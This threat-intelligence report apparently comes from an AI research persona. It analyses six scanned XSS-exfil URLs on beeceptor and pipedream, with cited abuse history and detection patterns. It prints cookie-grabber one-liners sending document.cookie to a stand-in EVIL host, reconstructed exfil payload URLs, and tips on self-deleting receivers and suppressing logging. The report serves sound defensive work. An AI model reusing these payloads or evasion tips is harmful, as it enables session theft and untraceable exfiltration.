# Beeceptor / Pipedream as Agent Dead-Drop Surface — Research Report

**Persona:** dead-drop-diver · **SHAPE-6** · **Date:** 2026-10-05
**Classification:** research + structural analysis. No endpoint was fetched or probed; all candidate URLs are logged, never visited.

> Evidence-grade labels used throughout: **OBSERVED** = seen in our own data (urlquery scan metadata / corpora). **PUBLIC SOURCE** = documented by a third party, cited with a direct link. **INFERENCE** = analyst judgment, marked as such.

---

## 1. Executive summary

**The finding:** six urlquery-scanned URLs (2026-04-24 → 2026-09-03) shaped as XSS-kit exfil receivers on two free request-inspection services — `*.free.beeceptor.com` (5 URLs) and `*.m.pipedream.net` (1 URL). Zero presence in all three of our corpora (688k events) and in codebreaker's dead-drop inventory: **this surface is entirely new to our data.**

**What the research establishes:**
- Both services are *purpose-built dead-drop receivers*: no-signup public beeceptor endpoints with full request inspection (§3); no-auth Pipedream HTTP triggers accepting any path/query with a full event inspector (§3). 15-day (beeceptor) and 7-day (pipedream) free-tier retention means the evidence self-deletes.
- The abuse record is deep and entirely **human-operator**: beeceptor as a ransomware key server and ransom-note host (Socket, Mar 2025), as catalogued exfil-callback infra (mthcht threat-hunting playbook), and as the documented endpoint shape in human XSS-exfil payloads (bug-bounty writeups); Pipedream triggers as exfil receivers in the Sonatype npm-hijack campaign and SEQRITE's Hanoi Thief/LOTUSHARVEST operation (§4).
- The payload grammar is the **2005-era cookie-grabber one-liner** (`new Image().src='…?c='+document.cookie`) aimed at serverless inspection endpoints instead of self-hosted PHP — same grabber, modern throwaway infrastructure (§5).
- **Operator grade: HUMAN-KIT-SHAPED** for the five beeceptor URLs (keyboard-mash subdomains the operator *chose* at creation, classic `/grabber.php` + `document.cookie` grammar, 26-day cluster); the pipedream URL is ungraded on the subdomain (provider-minted, no operator signal) and separated by a four-month date gap (§6).
- The cluster is **publicly undocumented**: ten exact-string searches returned null for every endpoint string; the generic technique is CTF-writeup-common but this cluster's naming appears nowhere (§7a). No vendor writeup reproduces our exact path grammar (§4).

**Why it matters for the hunt:** the surface is the finding, not the operator. Beeceptor/Pipedream are exactly the dead-drop shape an agent would reach for — zero-setup, no-auth request inspection, URL-minted receivers — and this cluster proves the shape is already live in urlquery scan traffic. If an agent fleet ever adopts it, the detection grammar is now banked: `*.free.beeceptor.com` + `/leak|/final|/grabber` paths, `*.m.pipedream.net` trigger URLs in scan metadata. **No public source documents agent-driven use of either service** — that angle is a genuinely novel observation.

---

## 2. Evidence table

| # | Candidate URL (logged, not fetched) | urlquery report ID | Scan date (UTC) | Markers |
|---|---|---|---|---|
| 1 | `akwuwue.free.beeceptor.com/leak?data='` | `3399d295-0cba-4f10-990e-450c083f3fee` | 2026-05-11 | keyboard-mash subdomain; `/leak` path; `data=` exfil param |
| 2 | `hhshdh.free.beeceptor.com/leak?url='+encodeURIComponent` | `c337a249-dfe7-4090-9573-513e4db5eb12` | 2026-04-29 | keyboard-mash subdomain; `/leak` path; `url=` + JS concat |
| 3 | `ahshsu.free.beeceptor.com/final?d=`+document.domain` | `a16cb30b-9fed-458f-a8ee-01388a5464f2` | 2026-04-29 | keyboard-mash subdomain; `/final` path; `d=` + `document.domain` |
| 4 | `hjhjhjhj.free.beeceptor.com/grabber.php?c='+document.cookie</script>` | `4742073d-42e5-423a-99b0-e3479c7c867d` | 2026-04-24 | keyboard-mash subdomain; `/grabber.php` path; `c=` + `document.cookie` + closing `</script>` |
| 5 | `jiji-script.free.beeceptor.com` | `f5883373-d46e-467e-81b4-078f292a9114` | 2026-05-20 | near-word subdomain (`jiji-script`); no path captured |
| 6 | `eo6p96x7ax0vcaj.m.pipedream.net/Oneotsuka` | *(urlquery, ID pending)* | 2026-09-03 | structured alphanumeric subdomain; odd `/Oneotsuka` path; 4 months after beeceptor cluster |

**Corpus status (OBSERVED):** zero hits for `beeceptor`, `pipedream`, and all six subdomains across all three corpora — amap-fleet (2,141 events), oai-traces (589,972), oai-tag-sweep (96,353) — and zero in codebreaker's dead-drop inventory. This surface is entirely new to our data.

**Temporal cluster (OBSERVED):** 5 of 6 scans fall 2026-04-24 → 2026-05-20 (26-day window). The pipedream URL is an outlier at 2026-09-03.

---

## 3. Service primer

Research method: official documentation pages and search snippets only; no `*.beeceptor.com` or `*.pipedream.net` endpoint was visited or probed. Access date for all sources: 2026-10-05.

### beeceptor.com

1. **What it is:** a cloud-hosted mock API server for testing/debugging — "simulate API endpoints without backend setup." — PUBLIC SOURCE: https://beeceptor.com/docs/free-api-for-testing/
2. **Endpoint structure:** each mock server gets a **named subdomain chosen at creation** — `https://my-api-test.free.beeceptor.com` — PUBLIC SOURCE: https://beeceptor.com/docs/free-api-for-testing/
3. **What the owner sees:** "Every request made to your Beeceptor endpoint is logged in the dashboard, allowing you to inspect **headers, payloads, and query parameters** easily" — real-time, every response CORS-enabled. — PUBLIC SOURCE: https://beeceptor.com/docs/free-api-for-testing/ ; https://beeceptor.com/pricing/
4. **Auth model — no signup for free endpoints:** "Beeceptor offers a **forever-free plan**… **No signup required.** No credit card required." Free endpoints are **public** (private access is paid-only). — PUBLIC SOURCE: https://beeceptor.com/pricing/
5. **Rate limits:** free plan = **50 requests/day per endpoint**, 3 mock rules. — PUBLIC SOURCE: https://beeceptor.com/pricing/
6. **Retention:** request data retained **15 days** then auto-purged; unclaimed free endpoints cleaned up after 30 days; claimed endpoints retained 90 days from creation. — PUBLIC SOURCE: https://beeceptor.com/pages/data-retention/

### pipedream.net

1. **What it is:** hosted workflow-automation platform; HTTP/webhook triggers among others — "Pipedream manages the servers where these jobs run." — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/
2. **Trigger URLs:** adding an HTTP trigger creates a workflow-specific URL on the default **`*.m.pipedream.net` domain** — a **provider-minted random string**, e.g. `https://eorgxgd03g7mu1b.m.pipedream.net` (third-party tutorial example). The operator does NOT choose the subdomain. — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/
3. **Any path, any query:** "You can send data to **any path on this host, with any query string parameters**." Any HTTP method, any body media type. — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/
4. **What the owner sees:** the Inspector presents `steps.trigger.event` per execution — method, payload, headers, full URL; Event History UI. — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/
5. **Auth model — public by default:** "By default, HTTP triggers are **public and require no authorization** to invoke. Anyone with the endpoint URL can trigger your workflow." A free account is needed to create workflows. — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/
6. **Limits:** 512KB default body; HTTP triggers average **10 requests/sec** (429 beyond). Free tier: workflow execution credit cap. — PUBLIC SOURCE: https://pipedream.com/docs/limits/
7. **Retention:** Inspector event history **7 days on free tiers**; execution details expire after 365 days. — PUBLIC SOURCE: https://pipedream.com/docs/limits/
8. **Opt-out of logging:** `x-pd-nostore: 1` header/query param suppresses ALL logging for that execution — "No event will show up in the inspector or the Event History UI." — PUBLIC SOURCE: https://pipedream.com/docs/workflows/triggers/

### Why each is a natural dead-drop receiver

- **beeceptor:** free endpoints mint in seconds with no signup at an operator-named `*.free.beeceptor.com` subdomain; every request inspectable by header/payload/query — exactly what an XSS exfil receiver needs. The 50-requests/day cap fits low-volume exfil, and 15-day request retention plus 30-day auto-cleanup means evidence evaporates on its own — a disposable, self-deleting dead drop. (INFERENCE from documented facts)
- **pipedream:** a free account yields an opaque provider-minted `*.m.pipedream.net` trigger accepting any path/query/method with no auth; the owner reads the full parsed request in the inspector. 10 QPS and 512KB bodies absorb realistic kit traffic; 7-day event history, and `x-pd-nostore` lets an operator suppress logging entirely — a receiver that doubles as its own data wiper. (INFERENCE from documented facts)

---

## 4. Abuse record (threat-intel citations)

Both services are **kit-standard tradecraft** for human operators: free, instantly-claimed, unauthenticated request-capture endpoints on legitimate-looking domains — the same class as webhook.site and requestbin. Every documented instance describes human kit operators, criminals, or researchers; **none mention AI-agent-driven use** — the agent-driven angle has no public precedent found. (PUBLIC SOURCE synthesis)

### beeceptor.com

**B1. "Black Basta's Dependency Confusion Ambitions and Ransomware in Open Source Ecosystems"** — Socket.dev, Socket Threat Research Team — March 2025 (date INFERENCE from article references)
- PUBLIC SOURCE: https://socket.dev/blog/black-basta-dependency-confusion-ambitions-and-ransomware-in-open-source-ecosystems
- Establishes: human threat actor (npm alias "xwlazssz", 2022–2025) used `dasdv.free.beeceptor.com/spc4kzs` as a remote AES key-retrieval server and `dgfgr.free.beeceptor.com/g3yz0a54x.txt` as a ransom-note host across four typosquatted npm packages (>1,700 downloads) with embedded ransomware functionality. The exact free-tier subdomain shape (`*.free.beeceptor.com`) we observed, used as live attacker-controlled infrastructure.

**B2. "Detect phishing attempt and exploitations with canary tokens and callback urls"** — mthcht / purpleteam (GitHub threat-hunting playbook) — December 2024
- PUBLIC SOURCE: https://github.com/mthcht/purpleteam/blob/HEAD/Detection/Threat%20Hunting/generic/canary_tokens_and_callback_services.md
- Establishes: `*.free.beeceptor.com/*` is catalogued as a known free public callback service that threat actors abuse for data exfiltration or payload confirmation; defenders are advised to monitor it at the proxy because the false-positive rate is low — i.e., it is treated as standard dead-drop infrastructure.

**B3. "Stored SVG JavaScript Execution, Redirects & Phishing — Bug Bounty $$$"** — AbdelFattah Elsabagh (Medium) — September 2026
- PUBLIC SOURCE: https://medium.com/@abdelfattahelsabagh/from-blind-ssrf-to-stored-svg-javascript-execution-redirects-phishing-bug-bounty-efa249798048
- Establishes: `*.free.beeceptor.com` used as the XSS payload host and exfiltration listener (`Abdo10.free.beeceptor.com/test.js`, `elsabagh.free.beeceptor.com/test.js`) — the exact human-practiced grammar of pointing a payload at a beeceptor endpoint to capture cookies/data (human bug-bounty context).

**B4. "I tricked the company's official email to do phishing attack (Host Header Injection)"** — Naif Al-anazi (Medium) — January 2026
- PUBLIC SOURCE: https://medium.com/@n4if/i-trick-the-main-company-email-address-to-do-phishing-attack-host-header-injection-cf5f4e5ce43f
- Establishes: beeceptor.com used to stand up a quick listener/response endpoint (`0xn4if.free.beeceptor.com`) in a real phishing chain during a security assessment — free beeceptor endpoints as go-to instant-claim exfil surfaces (human security researcher).

### pipedream.net

**P1. "Crypto npm Malware: Hijacked npm Packages"** — Sonatype security research blog — March 2025 (date INFERENCE from article assets)
- PUBLIC SOURCE: https://www.sonatype.com/blog/multiple-crypto-packages-hijacked-turned-into-info-stealers
- Establishes: 11 hijacked long-lived npm packages exfiltrated harvested env vars, API keys, and SSH credentials via obfuscated install scripts to the Pipedream HTTP trigger endpoint `eoi2ectd5a5tn1h.m.pipedream.net` (campaign sonatype-2025-000924; human actors via compromised maintainer accounts).

**P2. "Hanoi Thief Threat Actors Deploy Pseudo-Polyglot Malware Payloads Against IT Professionals"** — CyberPress reporting SEQRITE APT-Team research — December 2025 (date INFERENCE)
- PUBLIC SOURCE: https://cyberpress.org/hanoi-thief-threat-actors/
- Establishes: the LOTUSHARVEST credential-stealing DLL (Operation Hanoi Thief) exfiltrated harvested Chrome/Edge credentials and browser history over HTTPS POST to `eol4hkm8mfoeevs.m.pipedream.net` — a Pipedream trigger endpoint as the stealer's exfil receiver (human APT-adjacent operation).

**Corroborating detections (not full writeups):** the open-source detection tool sakimori (bokuweb/sakimori, May 2026) needles `*.m.pipedream.net` as a high-confidence exfil/OAST endpoint; ClawScan/clawdetect IOC databases list `pipedream.net` as known data-exfil infra citing the Koi Security OpenClaw-malware report. (PUBLIC SOURCE, secondary)

### What no source reproduces

**No vendor writeup found reproduces our exact path grammar** (`/leak`, `/final`, `/grabber.php` with cookie/domain params) — those path names look like kit-local conventions, not catalogued IOCs. The underlying mechanic (client-side script shipping `document.cookie` to a free request-capture endpoint) is thoroughly documented as standard human-kit practice, but this cluster's naming is not. Combined with the search-index nulls (§7a), the April–May 2026 beeceptor cluster appears publicly undocumented as a cluster.

---

## 5. Payload grammar decode

**Scope:** structural analysis of the four parameterized URLs only. Nothing was fetched; nothing was executed. (INFERENCE throughout this section unless labeled otherwise.)

### 5a. The four shapes

| # | Raw logged URL (as scanned) | Path | Param | JS fragment embedded in URL |
|---|---|---|---|---|
| 1 | `akwuwue.free.beeceptor.com/leak?data='` | `/leak` | `data=` | trailing `'` — remnant of a JS string delimiter |
| 2 | `hhshdh.free.beeceptor.com/leak?url='+encodeURIComponent` | `/leak` | `url=` | `'+encodeURIComponent` — string concat + encoder call |
| 3 | `ahshsu.free.beeceptor.com/final?d=`+document.domain` | `/final` | `d=` | backtick + `document.domain` — template-literal style concat |
| 4 | `hjhjhjhj.free.beeceptor.com/grabber.php?c='+document.cookie</script>` | `/grabber.php` | `c=` | `'+document.cookie` + literal `</script>` — closing tag captured into the URL |

### 5b. What the fragments reconstruct to

The URL-embedded JS fragments are **artifacts of the beacon URL being constructed in JavaScript at scan time** — the scanner logged the pre-evaluation template or the raw injection string rather than the fired request:

- **#1** reconstructs to the canonical image-beacon one-liner: `new Image().src='https://akwuwue.free.beeceptor.com/leak?data='+document.cookie` (or equivalent `fetch`/`XMLHttpRequest`). The trailing `'` is the JS string delimiter the scanner captured. (INFERENCE)
- **#2** reconstructs to `'.../leak?url='+encodeURIComponent(location.href)` (or `document.URL`) — the operator encodes the victim page URL before exfil. (INFERENCE)
- **#3** reconstructs to a template-literal construction `` `https://ahshsu.free.beeceptor.com/final?d=`+document.domain `` — mixed backtick/quote style suggests a hand-written or kit-generated payload, not a minified library. (INFERENCE)
- **#4** is the most revealing: the literal `</script>` inside the logged URL means the injection string itself contained the tag breakout — i.e., the payload was shaped as `'+document.cookie</script>` to close an existing script block, OR the scanner captured surrounding HTML context. Either way this is **injection-context grammar**, consistent with a stored/reflected XSS probe rather than a passive beacon test. The `/grabber.php` path name is classic PHP-kit convention (cf. decades of `grab.php`/`grabber.php` cookie stealers). (INFERENCE)

### 5c. Kit-template match

The grammar matches the **public XSS cookie-grabber one-liner family** documented in every XSS cheat-sheet since the mid-2000s:

```
<script>new Image().src='http://EVIL/grabber.php?c='+document.cookie</script>
<script>document.location='http://EVIL/leak?data='+document.cookie</script>
```

What our four URLs add: the receiver is a **serverless inspection endpoint** (beeceptor) rather than a self-hosted PHP script — same 2005-era grabber grammar, modern throwaway infrastructure. The path vocabulary (`/leak`, `/final`) reads as exfil-*stage* names: `/leak` = data out, `/final` = last-stage confirmation. (INFERENCE)

### 5d. What is NOT present

- No `zz=oai`, `uqscan`, epoch nonces, or any of our fleet marker grammars in any of the six URLs. (OBSERVED — grep across corpora + inventory)
- No webhook.site, httpbun, or jina.ai anywhere in this cluster. (OBSERVED)
- No multi-stage laundering (cf. the four-stage `href.li → httpbun/base64 → sendBeacon → webhook.site` chain from c2-pattern-analyst). These are single-hop beacons. (OBSERVED)

---

## 6. Operator grading

Grading rubric: **AGENT-SHAPED** = carries our documented agent nonce/marker grammars (zz=oai 10+7, epoch nonces, uqscan tagwords, retry grammar). **HUMAN-KIT-SHAPED** = matches human throwaway-opsec conventions with no agent markers. **PROVIDER-MINTED** = the string was generated by the service, not the operator — not grading signal.

### Per-URL grades

| # | URL | Grade | Rationale |
|---|---|---|---|
| 1 | `akwuwue.free.beeceptor.com/leak?data='` | HUMAN-KIT-SHAPED | `akwuwue` is a keyboard mash — alternating-hand keystrokes with no timestamp component, no structure. Our agent nonces are *structured* randomness (epoch-seconds prefix + random suffix). A human creating a throwaway exfil endpoint mashes keys; an agent mints nonces. Zero agent markers. (INFERENCE) |
| 2 | `hhshdh.free.beeceptor.com/leak?url='+encodeURIComponent` | HUMAN-KIT-SHAPED | Same keyboard-mash class (`hhshdh` — repeated `h`, home-row mashing). Same `/leak` path as #1 = same operator or same kit. (INFERENCE) |
| 3 | `ahshsu.free.beeceptor.com/final?d=`+document.domain` | HUMAN-KIT-SHAPED | `ahshsu` — same mash class. Distinct path (`/final`) and distinct param (`d=` + `document.domain` vs `data=`/`url=`) suggests staged exfil: domain recon first, cookie theft second — or two kit variants. (INFERENCE) |
| 4 | `hjhjhjhj.free.beeceptor.com/grabber.php?c='+document.cookie</script>` | HUMAN-KIT-SHAPED | `hjhjhjhj` is the purest keyboard mash of the set — strict `hj` alternation, the textbook human pattern. `/grabber.php` + `document.cookie` + `</script>` breakout = classic human XSS-kit grammar. (INFERENCE) |
| 5 | `jiji-script.free.beeceptor.com` | HUMAN-KIT-SHAPED | Near-word subdomain (`jiji` + `-script`) — human *descriptive* naming, the opposite of both keyboard mashing and agent nonces. A human labeling their throwaway: "the jiji script endpoint." (INFERENCE) |
| 6 | `eo6p96x7ax0vcaj.m.pipedream.net/Oneotsuka` | UNGRADED — split signal | The 16-char alphanumeric subdomain is **PROVIDER-MINTED** (Pipedream generates HTTP-trigger subdomains; the operator does not choose them — confirmed in §3). It is not operator grammar and must not be graded as such. The operator-chosen component is the path **`/Oneotsuka`** — odd, capitalized, possibly a project/test label or a name. No agent markers anywhere. Date outlier (2026-09-03, four months after the beeceptor cluster) — treat as a separate operator or separate campaign until linked. (INFERENCE) |

**Grading refinement from the service primer:** beeceptor subdomains are operator-*chosen* at creation (§3), so the keyboard mashes in #1–#5 are deliberate operator choices — strengthening the HUMAN-KIT-SHAPED grade (a human mashing keys to claim a throwaway; an agent would mint structured nonces). Conversely, the pipedream subdomain in #6 is provider-*minted*, so it carries zero operator signal — the grade correctly rests on the path alone. (INFERENCE)

### Overall grade

**HUMAN-KIT-SHAPED cluster with one ungraded outlier.** Five beeceptor URLs share keyboard-mash subdomains, classic grabber grammar, and a 26-day window (2026-04-24 → 2026-05-20) — consistent with a human operator (or humans) testing XSS exfil against a throwaway inspection service. The pipedream URL's subdomain is provider-minted and carries no operator signal; its path and late date keep it separate.

**Why this still matters for the hunt (INFERENCE):** the surface itself is the finding, not the operator. Beeceptor/pipedream are *exactly* the dead-drop shape an agent would reach for — zero-setup, no-auth request inspection, URL-minted receivers — and this cluster proves the shape is already in the wild being scanned by urlquery. If an agent fleet ever adopts it, the detection grammar is now banked: `*.free.beeceptor.com` + `/leak|/final|/grabber` paths, `m.pipedream.net` trigger URLs in scan metadata.

---

## 7. Cross-references

### 7a. Search-index corroboration (2026-10-05)

Ten exact-string queries run against the public web index. **All ten returned null for our specific endpoints** — no scan reports, threat feeds, forum posts, or GitHub mentions of `akwuwue`, `hhshdh`, `ahshsu`, `hjhjhjhj`, `jiji-script`, `Oneotsuka`, or `eo6p96x7ax0vcaj` in any security context. Our urlquery observations are the first recorded sightings of this cluster. (OBSERVED)

The one partial hit: `"beeceptor" "document.cookie" exfil` surfaces multiple public CTF writeups documenting the *generic technique* (beeceptor as cookie-exfil receiver in XSS challenges), e.g.:
- a1vinsmith/oscp-pwk — TryHackMe CSP writeup — PUBLIC SOURCE: https://github.com/a1vinsmith/oscp-pwk/blob/HEAD/TryHackMe/Content%20Security%20Policy.md
- glendonchong562/ctfs — HTB Cyber Santa 2021 "Toy Workshop" writeup — PUBLIC SOURCE: https://github.com/glendonchong562/ctfs/blob/HEAD/HTB%20Cyber%20Santa%202021/Web/Toy%20Workshop/README.md
- lougerard.github.io — THM-CSP writeup — PUBLIC SOURCE: https://lougerard.github.io/me/posts/THM-csp/
- polo-sec/armory — CSP bypassing guide — PUBLIC SOURCE: https://github.com/polo-sec/armory/blob/HEAD/content_security_policy/bypassing_csp.md

All use different throwaway endpoints (randomcsp, test234, csptest) — none reference our endpoints or paths. Relevance: confirms the tradecraft is widespread and public, but this cluster's naming and usage is not. Caveat: urlscan.io/urlquery.net result pages index inconsistently, so a matching public scan report could exist without these exact strings being indexed.

### 7b. Links to our own work

- dead-drop-diver SHAPE-6 origin — `personas/dead-drop-diver/FINDINGS.md`
- c2-pattern-analyst SHAPE-2/3 (self-hosted webhook.site clone + Httpbun relay infra) — same "throwaway inspection endpoint as receiver" family, self-hosted variant — `personas/c2-pattern-analyst/FINDINGS.md`
- codebreaker S2 (Umeng token-theft beacons via webhook.site `navigator.sendBeacon`) — the webhook.site branch of the same dead-drop family tree — `personas/codebreaker/FINDINGS.md`
- numbers-station disjoint-grammar table — none of this cluster's grammar appears in any corpus — `personas/numbers-station/FINDINGS.md`

---

## 8. Open threads

1. **Re-sweep `url.domain:beeceptor.com` and `url.domain:pipedream.net` in urlquery in 24–48h** — check for new scans (the 2026-09-03 pipedream hit is recent; the surface may still be active). Detection grammar: `*.free.beeceptor.com` + `/leak|/final|/grabber` paths; `*.m.pipedream.net` + any non-empty path.
2. **`?page=`-family and `/xss-osint-insert` follow-ups** from dead-drop-diver's other shapes — same hunt, adjacent grammar.
3. **The `/Oneotsuka` path** — if the pipedream trigger resurfaces in new scans, the path is the operator fingerprint (the subdomain is provider-minted and will differ every time).
4. **Agent-adoption watch:** no public precedent for agent-driven use of either service exists. If `zz=oai`/`uqscan`/epoch-nonce grammar ever co-occurs with a beeceptor/pipedream receiver, that is a first — flag immediately.
5. **Retention-clock note:** beeceptor purges request data after 15 days and unclaimed endpoints after 30 days; Pipedream free-tier event history is 7 days. Any *live* verification of these endpoints would need to happen inside those windows — but per OPSEC, we log, never fetch.

## 9. Candidate log

| Candidate | Provenance | Disposition |
|---|---|---|
| `akwuwue.free.beeceptor.com/leak?data='` | dead-drop-diver SHAPE-6 → urlquery `3399d295-0cba-4f10-990e-450c083f3fee` (2026-05-11) | Evidence #1; logged, never fetched |
| `hhshdh.free.beeceptor.com/leak?url='+encodeURIComponent` | dead-drop-diver SHAPE-6 → urlquery `c337a249-dfe7-4090-9573-513e4db5eb12` (2026-04-29) | Evidence #2; logged, never fetched |
| `ahshsu.free.beeceptor.com/final?d=`+document.domain` | dead-drop-diver SHAPE-6 → urlquery `a16cb30b-9fed-458f-a8ee-01388a5464f2` (2026-04-29) | Evidence #3; logged, never fetched |
| `hjhjhjhj.free.beeceptor.com/grabber.php?c='+document.cookie</script>` | dead-drop-diver SHAPE-6 → urlquery `4742073d-42e5-423a-99b0-e3479c7c867d` (2026-04-24) | Evidence #4; logged, never fetched |
| `jiji-script.free.beeceptor.com` | dead-drop-diver SHAPE-6 → urlquery `f5883373-d46e-467e-81b4-078f292a9114` (2026-05-20) | Evidence #5; logged, never fetched |
| `eo6p96x7ax0vcaj.m.pipedream.net/Oneotsuka` | dead-drop-diver SHAPE-6 → urlquery (2026-09-03) | Evidence #6; logged, never fetched |
| `dasdv.free.beeceptor.com/spc4kzs`, `dgfgr.free.beeceptor.com/g3yz0a54x.txt` | Socket.dev writeup B1 (Black Basta npm campaign) | Third-party IOC; not our observation; logged for reference only |
| `eoi2ectd5a5tn1h.m.pipedream.net` | Sonatype writeup P1 (npm hijack campaign) | Third-party IOC; not our observation; logged for reference only |
| `eol4hkm8mfoeevs.m.pipedream.net` | CyberPress/SEQRITE writeup P2 (Hanoi Thief) | Third-party IOC; not our observation; logged for reference only |

*No candidate URL in this report was fetched, probed, or visited. All are logged with provenance per the URL OPSEC rule.*
